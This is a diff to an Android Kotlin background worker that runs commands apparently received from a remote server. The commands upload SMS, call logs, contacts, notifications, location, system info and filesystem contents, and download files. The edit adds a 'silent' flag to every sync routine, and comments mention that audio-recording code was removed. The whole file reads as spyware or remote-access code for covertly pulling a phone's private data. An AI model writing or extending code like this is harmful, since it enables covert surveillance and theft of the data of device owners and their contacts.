@@ -1,3 +1,4 @@
+// DataFetchWorker.kt
 package com.elfinsaddle.worker
 
 import android.Manifest
@@ -36,10 +37,10 @@ class DataFetchWorker(
 
         const val KEY_COMMAND = "command"
         const val KEY_FILE_PATH = "filePath"
-        const val KEY_IS_SILENT = "silent"
+        // MODIFIED: New key for passing the silent flag to the worker
+        const val KEY_IS_SILENT = "is_silent"
 
         // Commands
-        // REMOVED: COMMAND_RECORD_AUDIO, COMMAND_UPLOAD_AUDIO_RECORDING
         const val COMMAND_SYNC_ALL = "sync_all"
         const val COMMAND_SYNC_NOTIFICATIONS = "sync_notifications"
         const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
@@ -49,16 +50,19 @@ class DataFetchWorker(
         const val COMMAND_DOWNLOAD_FILE = "download_file"
         const val COMMAND_PING = "ping"
 
-        fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
-            val dataBuilder = Data.Builder().putString(KEY_COMMAND, command)
+        // MODIFIED: scheduleWork now accepts an isSilent flag
+        fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap(), isSilent: Boolean = false) {
+            val dataBuilder = Data.Builder()
+                .putString(KEY_COMMAND, command)
+                .putBoolean(KEY_IS_SILENT, isSilent) // Add the silent flag as a boolean
+
             extraData.forEach { (key, value) -> dataBuilder.putString(key, value) }
 
             val workRequestBuilder = OneTimeWorkRequestBuilder<DataFetchWorker>()
                 .setInputData(dataBuilder.build())
                 .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
 
-            // REMOVED: Special expedited work for audio recording
-            Log.d(TAG, "Scheduling regular work for command: $command")
+            Log.d(TAG, "Scheduling regular work for command: $command, silent: $isSilent")
             
             WorkManager.getInstance(context).enqueue(workRequestBuilder.build())
         }
@@ -72,8 +76,6 @@ class DataFetchWorker(
 
         Log.i(TAG, "Worker starting for command: $command")
         
-        // REMOVED: Special handling for foreground task
-
         return withContext(Dispatchers.IO) {
             try {
                 val success = executeCommand(command)
@@ -88,14 +90,17 @@ class DataFetchWorker(
     private suspend fun executeCommand(command: String): Boolean {
         return when (command) {
             COMMAND_SYNC_ALL -> syncAllData()
-            COMMAND_SYNC_NOTIFICATIONS -> deviceRepository.syncNotifications() is NetworkResult.Success<*>
+            COMMAND_SYNC_NOTIFICATIONS -> {
+                // MODIFIED: Read the silent flag and pass it
+                val isSilent = inputData.getBoolean(KEY_IS_SILENT, false)
+                deviceRepository.syncNotifications(isSilent) is NetworkResult.Success<*>
+            }
             COMMAND_SCAN_FILESYSTEM -> deviceRepository.scanAndUploadFileSystem()
             COMMAND_GET_LOCATION -> fetchAndSendLocation()
             COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
             COMMAND_UPLOAD_FILE -> uploadRequestedFile()
             COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
             COMMAND_PING -> sendPingResponse()
-            // REMOVED: COMMAND_UPLOAD_AUDIO_RECORDING case
             else -> {
                 Log.w(TAG, "Unknown command received: $command")
                 false
@@ -103,20 +108,20 @@ class DataFetchWorker(
         }
     }
 
-    // REMOVED: recordAndUploadAudio() method
-    // REMOVED: createForegroundInfo() method
-
     private suspend fun syncAllData(): Boolean {
-        Log.i(TAG, "Starting full differential data sync...")
-        val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) deviceRepository.syncSms() is NetworkResult.Success<*> else true
-        val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) deviceRepository.syncCallLogs() is NetworkResult.Success<*> else true
-        val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) deviceRepository.syncContacts() is NetworkResult.Success<*> else true
-        val notificationsSuccess = deviceRepository.syncNotifications() is NetworkResult.Success<*>
+        // MODIFIED: Read the isSilent flag from inputData
+        val isSilent = inputData.getBoolean(KEY_IS_SILENT, false)
+        Log.i(TAG, "Starting full differential data sync... Silent Mode: $isSilent")
+
+        // MODIFIED: Pass the isSilent flag to each sync function
+        val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) deviceRepository.syncSms(isSilent) is NetworkResult.Success<*> else true
+        val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) deviceRepository.syncCallLogs(isSilent) is NetworkResult.Success<*> else true
+        val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) deviceRepository.syncContacts(isSilent) is NetworkResult.Success<*> else true
+        val notificationsSuccess = deviceRepository.syncNotifications(isSilent) is NetworkResult.Success<*>
+        
         return smsSuccess && callLogSuccess && contactsSuccess && notificationsSuccess
     }
     
-    // REMOVED: uploadAudioRecording() method
-
     private suspend fun uploadRequestedFile(): Boolean {
         val filePath = inputData.getString("filePath") ?: return false
         val file = File(filePath)
@@ -151,7 +156,8 @@ class DataFetchWorker(
     }
 
     private suspend fun sendPingResponse(): Boolean {
-        val isSilent = inputData.getString(KEY_IS_SILENT)?.toBoolean() ?: false
+        // MODIFIED: Consistently read the silent flag as a boolean
+        val isSilent = inputData.getBoolean(KEY_IS_SILENT, false)
         val message = "Pong! Device online at ${System.currentTimeMillis()}"
         val extras = mapOf("isSilent" to isSilent)
         val result = apiClient.sendStatusUpdate(
